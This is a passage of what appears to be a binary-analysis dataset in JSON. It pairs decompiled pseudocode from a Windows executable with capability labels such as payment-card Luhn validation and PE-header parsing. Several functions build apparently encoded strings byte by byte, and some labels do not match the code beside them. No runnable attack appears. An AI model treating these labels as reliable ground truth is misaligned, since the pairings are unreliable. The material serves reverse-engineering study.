        "decompiled_code": "\nint64_t fcn.1400bcd00(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + -0xa0) = 0;\n    *(arg1 + -0x90) = arg2;\n    *(arg1 + -0x88) = arg3;\n    uVar1 = fcn.1400b6680();\n    *(arg1 + -0x80) = uVar1;\n    uVar1 = fcn.1400b60b0();\n    *(arg1 + -0x78) = uVar1;\n    *(arg1 + -0x40) = 0x474e5543432b2b00;\n    *(arg1 + -0x38) = 0x14001f5b0;\n    return arg1 + -0xa0;\n}\n",
        "token_count": 190
    },
    "1400bcdb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.1400bcdb0(ulong arg1, ulong arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    int64_t *piVar5;\n    ulong uVar6;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    int64_t in_R9;\n    int64_t iStack128;\n    ulong uStack120;\n    ulong uStack112;\n    int64_t *piStack88;\n    ulong uStack80;\n    int64_t *piStack72;\n    \n    iVar3 = fcn.1400bcb60();\n    *(iVar3 + 8) = *(iVar3 + 8) + 1;\n    uVar6 = arg2;\n    piVar8 = arg3;\n    puVar4 = fcn.1400bcd00(arg1, arg2, arg3);\n    *puVar4 = 1;\n    piStack88 = puVar4 + 0x18;\n    fcn.140014ef0(piStack88);\n    piVar5 = piStack88;\n    fcn.1400bc860(piStack88);\n    fcn.1400b8f90();\n    if (piVar5 != NULL) {\n        piVar7 = *(*piVar5 + -0x10) + piVar5;\n        piVar1 = *(*piVar5 + -8);\n        iStack128 = 0;\n        uStack112 = 0x1000000000;\n        uStack120 = 0;\n        if ((*(*piVar7 + -8) == piVar1) &&\n           (uStack80 = arg2,  piStack72 = arg3, \n           (**(*piVar1 + 0x38))(piVar1, in_R9, 6, piVar8, piVar7, uVar6, piVar5, &iStack128),  iStack128 != 0)) {\n            if ((uStack112 & 6) == 6) {\n                return iStack128;\n            }\n            if ((uStack120 & uStack120._4_4_ & 6) == 6) {\n                return iStack128;\n            }\n            if (((uStack120._4_4_ & 5) != 4) && (uStack112 == 0)) {\n                if (in_R9 < 0) {\n                    if ((in_R9 != -2) &&\n                       (uVar2 = (**(*piVar8 + 0x40))(piVar8, in_R9, iStack128, uVar6, piVar5),  (uVar2 & 6) == 6)) {\n                        return iStack128;\n                    }\n                }\n                else if (piVar5 == iStack128 + in_R9) {\n                    return iStack128;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 657
    },
    "1400bd17": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400bd170(void)\n\n{\n    int64_t *piVar1;\n    ulong uVar2;\n    ulong uVar3;\n    \n    piVar1 = fcn.1400bc7f0(8);\n    *piVar1 = *0x140110790 + 0x10;\n    fcn.1400bcdb0(piVar1, 0x1401135d0, fcn.1400b4730);\n    piVar1 = fcn.1400bc7f0(8);\n    *piVar1 = *0x140110630 + 0x10;\n    fcn.1400bcdb0(piVar1, 0x140112fc0, 0x1400a1ff0);\n    piVar1 = fcn.1400bc7f0(8);\n    *piVar1 = *0x140110720 + 0x10;\n    fcn.1400bcdb0(piVar1, 0x140113420, 0x1400b2530);\n    piVar1 = fcn.1400bc7f0(8);\n    *piVar1 = *0x140110410 + 0x10;\n    fcn.1400bcdb0(piVar1, 0x1401126b0, 0x14007eba0);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140080c80(uVar2, piVar1);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112830, fcn.140080e50);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140082c60(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x1401128c0, 0x140082de0);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.14009e990(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112d70, 0x14009eb10);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140082e50(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x1401128e0, 0x140082fd0);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140083040(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112900, 0x1400831c0);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140095db0(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112a70, fcn.140095f80);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140080f00(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112850, 0x140081080);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.14009b0e0(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112bd0, 0x14009b260);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.14009d640(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112d10, 0x14009d7c0);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    if (*0x1401067a0 == '\\0') {\n        *0x1401067a0 = '\\x01';\n    }\n    if (*0x1401067c0 == '\\0') {\n        *0x1401067c0 = '\\x01';\n    }\n    if (*0x140106860 == '\\0') {\n        *0x140106860 = '\\x01';\n    }\n    if (*0x140106880 == '\\0') {\n        *0x140106880 = '\\x01';\n    }\n    if (*0x140106620 == '\\0') {\n        *0x140106620 = '\\x01';\n    }\n    if (*0x140106630 == '\\0') {\n        *0x140106630 = '\\x01';\n    }\n    if (*0x140106800 == '\\0') {\n        *0x140106800 = '\\x01';\n    }\n    if (*0x140106660 == '\\0') {\n        *0x140106660 = '\\x01';\n    }\n    if (*0x140106840 == '\\0') {\n        *0x140106840 = '\\x01';\n    }\n    if (*0x140106820 == '\\0') {\n        *0x140106820 = '\\x01';\n    }\n    if (*0x1401067e0 == '\\0') {\n        *0x1401067e0 = '\\x01';\n    }\n    if (*0x140106780 == '\\0') {\n        *0x140106780 = '\\x01';\n    }\n    return;\n}\n",
        "token_count": 1474
    },
    "1400bd1b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400bd1b0(void)\n\n{\n    int64_t *piVar1;\n    ulong uVar2;\n    ulong uVar3;\n    \n    piVar1 = fcn.1400bc7f0(8);\n    *piVar1 = *0x140110630 + 0x10;\n    fcn.1400bcdb0(piVar1, 0x140112fc0, 0x1400a1ff0);\n    piVar1 = fcn.1400bc7f0(8);\n    *piVar1 = *0x140110720 + 0x10;\n    fcn.1400bcdb0(piVar1, 0x140113420, 0x1400b2530);\n    piVar1 = fcn.1400bc7f0(8);\n    *piVar1 = *0x140110410 + 0x10;\n    fcn.1400bcdb0(piVar1, 0x1401126b0, 0x14007eba0);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140080c80(uVar2, piVar1);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112830, fcn.140080e50);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140082c60(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x1401128c0, 0x140082de0);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.14009e990(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112d70, 0x14009eb10);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140082e50(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x1401128e0, 0x140082fd0);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140083040(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112900, 0x1400831c0);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140095db0(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112a70, fcn.140095f80);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140080f00(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112850, 0x140081080);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.14009b0e0(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112bd0, 0x14009b260);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.14009d640(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112d10, 0x14009d7c0);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    if (*0x1401067a0 == '\\0') {\n        *0x1401067a0 = '\\x01';\n    }\n    if (*0x1401067c0 == '\\0') {\n        *0x1401067c0 = '\\x01';\n    }\n    if (*0x140106860 == '\\0') {\n        *0x140106860 = '\\x01';\n    }\n    if (*0x140106880 == '\\0') {\n        *0x140106880 = '\\x01';\n    }\n    if (*0x140106620 == '\\0') {\n        *0x140106620 = '\\x01';\n    }\n    if (*0x140106630 == '\\0') {\n        *0x140106630 = '\\x01';\n    }\n    if (*0x140106800 == '\\0') {\n        *0x140106800 = '\\x01';\n    }\n    if (*0x140106660 == '\\0') {\n        *0x140106660 = '\\x01';\n    }\n    if (*0x140106840 == '\\0') {\n        *0x140106840 = '\\x01';\n    }\n    if (*0x140106820 == '\\0') {\n        *0x140106820 = '\\x01';\n    }\n    if (*0x1401067e0 == '\\0') {\n        *0x1401067e0 = '\\x01';\n    }\n    if (*0x140106780 == '\\0') {\n        *0x140106780 = '\\x01';\n    }\n    return;\n}\n",
        "token_count": 1410
    },
    "1400bd1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400bd1f0(void)\n\n{\n    int64_t *piVar1;\n    ulong uVar2;\n    ulong uVar3;\n    \n    piVar1 = fcn.1400bc7f0(8);\n    *piVar1 = *0x140110720 + 0x10;\n    fcn.1400bcdb0(piVar1, 0x140113420, 0x1400b2530);\n    piVar1 = fcn.1400bc7f0(8);\n    *piVar1 = *0x140110410 + 0x10;\n    fcn.1400bcdb0(piVar1, 0x1401126b0, 0x14007eba0);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140080c80(uVar2, piVar1);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112830, fcn.140080e50);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140082c60(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x1401128c0, 0x140082de0);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.14009e990(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112d70, 0x14009eb10);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140082e50(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x1401128e0, 0x140082fd0);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140083040(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112900, 0x1400831c0);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140095db0(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112a70, fcn.140095f80);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.140080f00(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112850, 0x140081080);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.14009b0e0(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112bd0, 0x14009b260);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    uVar2 = fcn.1400bc7f0(0x10);\n    fcn.14009d640(uVar2, uVar3);\n    uVar3 = fcn.1400bcdb0(uVar2, 0x140112d10, 0x14009d7c0);\n    fcn.1400bcb10(uVar2);\n    fcn.140014f30(uVar3);\n    if (*0x1401067a0 == '\\0') {\n        *0x1401067a0 = '\\x01';\n    }\n    if (*0x1401067c0 == '\\0') {\n        *0x1401067c0 = '\\x01';\n    }\n    if (*0x140106860 == '\\0') {\n        *0x140106860 = '\\x01';\n    }\n    if (*0x140106880 == '\\0') {\n        *0x140106880 = '\\x01';\n    }\n    if (*0x140106620 == '\\0') {\n        *0x140106620 = '\\x01';\n    }\n    if (*0x140106630 == '\\0') {\n        *0x140106630 = '\\x01';\n    }\n    if (*0x140106800 == '\\0') {\n        *0x140106800 = '\\x01';\n    }\n    if (*0x140106660 == '\\0') {\n        *0x140106660 = '\\x01';\n    }\n    if (*0x140106840 == '\\0') {\n        *0x140106840 = '\\x01';\n    }\n    if (*0x140106820 == '\\0') {\n        *0x140106820 = '\\x01';\n    }\n    if (*0x1401067e0 == '\\0') {\n        *0x1401067e0 = '\\x01';\n    }\n    if (*0x140106780 == '\\0') {\n        *0x140106780 = '\\x01';\n    }\n    return;\n}\n",
        "token_count": 1344
    },
    "1400bd7d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.1400bd7d0(void)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    ulong uVar3;\n    ulong *arg1;\n    uint32_t uVar4;\n    uint64_t uStack272;\n    ulong uStack264;\n    ulong *puStack256;\n    ulong uStack248;\n    ulong uStack200;\n    ulong uStack192;\n    ulong uStack176;\n    \n    piVar2 = fcn.1400bc7f0(8);\n    *piVar2 = *0x140110720 + 0x10;\n    fcn.1400bcdb0(piVar2, 0x140113420, 0x1400b2530);\n    piVar2 = fcn.1400bc7f0(8);\n    *piVar2 = *0x140110410 + 0x10;\n    fcn.1400bcdb0(piVar2, 0x1401126b0, 0x14007eba0);\n    piVar2 = fcn.1400bc7f0(8);\n    *piVar2 = *0x140110630 + 0x10;\n    fcn.1400bcdb0(piVar2, 0x140112fc0, 0x1400a1ff0);\n    uStack176 = fcn.1400bc7f0(8);\n    fcn.1400219a0(uStack176);\n    uVar3 = uStack176;\n    fcn.1400bcdb0(uStack176, 0x1401118c0, 0x1400219e0);\n    puStack256 = fcn.1400bc7f0(0x30);\n    uStack200 = 1;\n    uStack192 = 0x1401072a0;\n    fcn.140083230(puStack256, &uStack200, uVar3);\n    *puStack256 = 0x140117c30;\n    uVar3 = fcn.140027080(puStack256);\n    fcn.1400b7a50(puStack256 + 4, uVar3);\n    uVar4 = 0x40112940;\n    uStack248 = fcn.1400bcdb0(puStack256, 0x140112940, 0x140089280);\n    *puStack256 = 0x140117680;\n    fcn.1400838b0(puStack256);\n    fcn.1400bcb10(puStack256);\n    uVar3 = uStack248;\n    fcn.140014f30(uStack248);\n    arg1 = fcn.1400bc7f0(0x30);\n    uStack264 = 0x1401072a0;\n    uStack272 = 1;\n    if (uVar4 != 0) {\n        uStack264 = fcn.1400a20f0();\n        uStack272 = uVar4;\n    }\n    fcn.140083230(arg1, &uStack272, uVar3);\n    *arg1 = 0x140117c30;\n    uVar3 = fcn.140027080(arg1);\n    fcn.1400b7a50(arg1 + 4, uVar3);\n    uVar3 = fcn.1400bcdb0(arg1, 0x140112940, 0x140089280);\n    *arg1 = 0x140117680;\n    fcn.1400838b0(arg1);\n    fcn.1400bcb10(arg1);\n    fcn.140014f30(uVar3);\n    iVar1 = sub.msvcrt.dll__onexit(0x1400bcfe0);\n    return -(iVar1 == 0);\n}\n",
        "token_count": 835
    },
    "1400bd85": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.1400bd850(void)\n\n{\n    int64_t iVar1;\n    int64_t *arg1;\n    ulong uVar2;\n    ulong *arg1_00;\n    uint32_t uVar3;\n    uint64_t uStack192;\n    ulong uStack184;\n    ulong *puStack176;\n    ulong uStack168;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack96;\n    \n    arg1 = fcn.1400bc7f0(8);\n    *arg1 = *0x140110630 + 0x10;\n    fcn.1400bcdb0(arg1, 0x140112fc0, 0x1400a1ff0);\n    uStack96 = fcn.1400bc7f0(8);\n    fcn.1400219a0(uStack96);\n    uVar2 = uStack96;\n    fcn.1400bcdb0(uStack96, 0x1401118c0, 0x1400219e0);\n    puStack176 = fcn.1400bc7f0(0x30);\n    uStack120 = 1;\n    uStack112 = 0x1401072a0;\n    fcn.140083230(puStack176, &uStack120, uVar2);\n    *puStack176 = 0x140117c30;\n    uVar2 = fcn.140027080(puStack176);\n    fcn.1400b7a50(puStack176 + 4, uVar2);\n    uVar3 = 0x40112940;\n    uStack168 = fcn.1400bcdb0(puStack176, 0x140112940, 0x140089280);\n    *puStack176 = 0x140117680;\n    fcn.1400838b0(puStack176);\n    fcn.1400bcb10(puStack176);\n    uVar2 = uStack168;\n    fcn.140014f30(uStack168);\n    arg1_00 = fcn.1400bc7f0(0x30);\n    uStack184 = 0x1401072a0;\n    uStack192 = 1;\n    if (uVar3 != 0) {\n        uStack184 = fcn.1400a20f0();\n        uStack192 = uVar3;\n    }\n    fcn.140083230(arg1_00, &uStack192, uVar2);\n    *arg1_00 = 0x140117c30;\n    uVar2 = fcn.140027080(arg1_00);\n    fcn.1400b7a50(arg1_00 + 4, uVar2);\n    uVar2 = fcn.1400bcdb0(arg1_00, 0x140112940, 0x140089280);\n    *arg1_00 = 0x140117680;\n    fcn.1400838b0(arg1_00);\n    fcn.1400bcb10(arg1_00);\n    fcn.140014f30(uVar2);\n    iVar1 = sub.msvcrt.dll__onexit(0x1400bcfe0);\n    return -(iVar1 == 0);\n}\n",
        "token_count": 720
    },
    "140001ac": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.140001ac8(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x4d;\n    arg1[1] = 0x6c;\n    arg1[2] = 0x61;\n    arg1[3] = 0x51;\n    arg1[4] = 0x7c;\n    arg1[5] = 0x5b;\n    arg1[6] = 0x77;\n    arg1[7] = 0x79;\n    arg1[8] = 0x50;\n    arg1[9] = 0x4e;\n    arg1[10] = 0x5b;\n    arg1[0xb] = 0x75;\n    arg1[0xc] = 0x30;\n    arg1[0xd] = 0x20;\n    arg1[0xe] = 0xf;\n    arg1[0xf] = 0x29;\n    arg1[0x10] = 0xd;\n    arg1[0x11] = 0;\n    arg1[0x12] = 0x16;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0xe;\n    arg1[0x15] = 8;\n    arg1[0x16] = 3;\n    arg1[0x17] = 7;\n    arg1[0x18] = 9;\n    arg1[0x19] = 9;\n    arg1[0x1a] = 0x6e;\n    arg1[0x1b] = 0x3b;\n    arg1[0x1c] = 0x3f;\n    arg1[0x1d] = 0x71;\n    arg1[0x1e] = 0x3d;\n    arg1[0x1f] = 0x23;\n    arg1[0x20] = 0x31;\n    arg1[0x21] = 0x3b;\n    arg1[0x22] = 0x76;\n    arg1[0x23] = 0x23;\n    arg1[0x24] = 0x30;\n    arg1[0x25] = 0x3c;\n    arg1[0x26] = 0x7a;\n    arg1[0x27] = 0x2f;\n    arg1[0x28] = 0x3d;\n    arg1[0x29] = 0x2f;\n    arg1[0x2a] = 0x39;\n    arg1[0x2b] = 0x3a;\n    arg1[0x2c] = 0x14;\n    arg1[0x2d] = 0x41;\n    arg1[0x2e] = 0x12;\n    arg1[0x2f] = 0x11;\n    arg1[0x30] = 0xb;\n    arg1[0x31] = 6;\n    arg1[0x32] = 3;\n    arg1[0x33] = 0x14;\n    arg1[0x34] = 0x1b;\n    arg1[0x35] = 0x45;\n    arg1[0x36] = 0x14;\n    arg1[0x37] = 0x50;\n    arg1[0x38] = 0x4e;\n    arg1[0x39] = 0x5e;\n    arg1[0x3a] = 0x4c;\n    arg1[0x3b] = 0x50;\n    arg1[0x3c] = 0x54;\n    arg1[0x3d] = 0x5c;\n    arg1[0x3e] = 6;\n    arg1[0x3f] = 0x1d;\n    arg1[0x40] = 0x3e;\n    return arg1;\n}\n",
        "token_count": 943
    },
    "14000215": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.14000215e(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x7e;\n    arg1[1] = 100;\n    arg1[2] = 0x57;\n    arg1[3] = 0x6f;\n    arg1[4] = 0x6d;\n    arg1[5] = 0x4a;\n    arg1[6] = 0x62;\n    arg1[7] = 0x41;\n    arg1[8] = 0x73;\n    arg1[9] = 0x49;\n    arg1[10] = 0x7a;\n    arg1[0xb] = 0x7a;\n    arg1[0xc] = 0x30;\n    arg1[0xd] = 8;\n    arg1[0xe] = 0x38;\n    arg1[0xf] = 5;\n    arg1[0x10] = 0xc;\n    arg1[0x11] = 0x20;\n    arg1[0x12] = 0x3f;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0x29;\n    arg1[0x15] = 0x25;\n    arg1[0x16] = 0x26;\n    arg1[0x17] = 0x24;\n    arg1[0x18] = 0x2f;\n    arg1[0x19] = 0x2c;\n    arg1[0x1a] = 0x3a;\n    arg1[0x1b] = 0x2a;\n    arg1[0x1c] = 0x34;\n    arg1[0x1d] = 0x71;\n    arg1[0x1e] = 0x3f;\n    arg1[0x1f] = 0x36;\n    arg1[0x20] = 0x39;\n    arg1[0x21] = 0x3a;\n    arg1[0x22] = 0x24;\n    arg1[0x23] = 0x2e;\n    arg1[0x24] = 0x78;\n    arg1[0x25] = 0x30;\n    arg1[0x26] = 0x34;\n    arg1[0x27] = 0x7b;\n    arg1[0x28] = 0x28;\n    arg1[0x29] = 0x35;\n    arg1[0x2a] = 0x3b;\n    arg1[0x2b] = 0x7f;\n    arg1[0x2c] = 3;\n    arg1[0x2d] = 0x14;\n    arg1[0x2e] = 0x10;\n    arg1[0x2f] = 0x11;\n    arg1[0x30] = 1;\n    arg1[0x31] = 0xb;\n    arg1[0x32] = 0x12;\n    arg1[0x33] = 0x47;\n    arg1[0x34] = 0x18;\n    arg1[0x35] = 0x1b;\n    arg1[0x36] = 0x5b;\n    arg1[0x37] = 0x56;\n    arg1[0x38] = 0x53;\n    arg1[0x39] = 0x44;\n    arg1[0x3a] = 0x4b;\n    arg1[0x3b] = 0x19;\n    arg1[0x3c] = 0x49;\n    arg1[0x3d] = 0x4e;\n    arg1[0x3e] = 0x5f;\n    arg1[0x3f] = 0x58;\n    arg1[0x40] = 0x4d;\n    arg1[0x41] = 0x4c;\n    arg1[0x42] = 0x26;\n    arg1[0x43] = 0x34;\n    arg1[0x44] = 0x2e;\n    arg1[0x45] = 0x2f;\n    arg1[0x46] = 0x3d;\n    arg1[0x47] = 0x6b;\n    arg1[0x48] = 0x46;\n    return arg1;\n}\n",
        "token_count": 1069
    },
    "14000288": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.14000288c(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x5a;\n    arg1[1] = 0x73;\n    arg1[2] = 0x57;\n    arg1[3] = 0x51;\n    arg1[4] = 0x68;\n    arg1[5] = 0x6d;\n    arg1[6] = 0x6e;\n    arg1[7] = 0x57;\n    arg1[8] = 0x54;\n    arg1[9] = 0x5a;\n    arg1[10] = 0x4c;\n    arg1[0xb] = 0x6d;\n    arg1[0xc] = 0x14;\n    arg1[0xd] = 0;\n    arg1[0xe] = 5;\n    arg1[0xf] = 0x1b;\n    arg1[0x10] = 0xd;\n    arg1[0x11] = 0xd;\n    arg1[0x12] = 0x2b;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0xe;\n    arg1[0x15] = 8;\n    arg1[0x16] = 3;\n    arg1[0x17] = 7;\n    arg1[0x18] = 9;\n    arg1[0x19] = 9;\n    arg1[0x1a] = 0x6e;\n    arg1[0x1b] = 0x3b;\n    arg1[0x1c] = 0x3f;\n    arg1[0x1d] = 0x71;\n    arg1[0x1e] = 0x3f;\n    arg1[0x1f] = 0x3c;\n    arg1[0x20] = 0x30;\n    arg1[0x21] = 0x3c;\n    arg1[0x22] = 0x30;\n    arg1[0x23] = 0x2e;\n    arg1[0x24] = 0x78;\n    arg1[0x25] = 0x29;\n    arg1[0x26] = 0x3f;\n    arg1[0x27] = 0x29;\n    arg1[0x28] = 0x31;\n    arg1[0x29] = 0x34;\n    arg1[0x2a] = 0x2d;\n    arg1[0x2b] = 0x2c;\n    arg1[0x2c] = 9;\n    arg1[0x2d] = 0xe;\n    arg1[0x2e] = 0xc;\n    arg1[0x2f] = 0x10;\n    arg1[0x30] = 0x5e;\n    arg1[0x31] = 0x45;\n    arg1[0x32] = 0x66;\n    return arg1;\n}\n",
        "token_count": 737
    },
    "140002a3": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.140002a36(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x5a;\n    arg1[1] = 0x73;\n    arg1[2] = 0x57;\n    arg1[3] = 0x51;\n    arg1[4] = 0x68;\n    arg1[5] = 0x6d;\n    arg1[6] = 0x6e;\n    arg1[7] = 0x57;\n    arg1[8] = 0x54;\n    arg1[9] = 0x5a;\n    arg1[10] = 0x4c;\n    arg1[0xb] = 0x6d;\n    arg1[0xc] = 0x14;\n    arg1[0xd] = 0;\n    arg1[0xe] = 5;\n    arg1[0xf] = 0x1b;\n    arg1[0x10] = 0xd;\n    arg1[0x11] = 0xd;\n    arg1[0x12] = 0x2b;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0x25;\n    arg1[0x15] = 0x26;\n    arg1[0x16] = 0x2e;\n    arg1[0x17] = 0x22;\n    arg1[0x18] = 0x2a;\n    arg1[0x19] = 0x24;\n    arg1[0x1a] = 0x2b;\n    arg1[0x1b] = 0x2b;\n    arg1[0x1c] = 0x70;\n    arg1[0x1d] = 0x21;\n    arg1[0x1e] = 0x37;\n    arg1[0x1f] = 0x21;\n    arg1[0x20] = 0x39;\n    arg1[0x21] = 0x3c;\n    arg1[0x22] = 0x25;\n    arg1[0x23] = 0x24;\n    arg1[0x24] = 0x31;\n    arg1[0x25] = 0x36;\n    arg1[0x26] = 0x34;\n    arg1[0x27] = 0x28;\n    arg1[0x28] = 0x7c;\n    arg1[0x29] = 0x2e;\n    arg1[0x2a] = 0x2b;\n    arg1[0x2b] = 0x3c;\n    arg1[0x2c] = 3;\n    arg1[0x2d] = 4;\n    arg1[0x2e] = 0x11;\n    arg1[0x2f] = 0x10;\n    arg1[0x30] = 2;\n    arg1[0x31] = 0x10;\n    arg1[0x32] = 10;\n    arg1[0x33] = 0xb;\n    arg1[0x34] = 0x11;\n    arg1[0x35] = 0x47;\n    arg1[0x36] = 0x34;\n    return arg1;\n}\n",
        "token_count": 797
    },
    "140002c0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections"
        ],
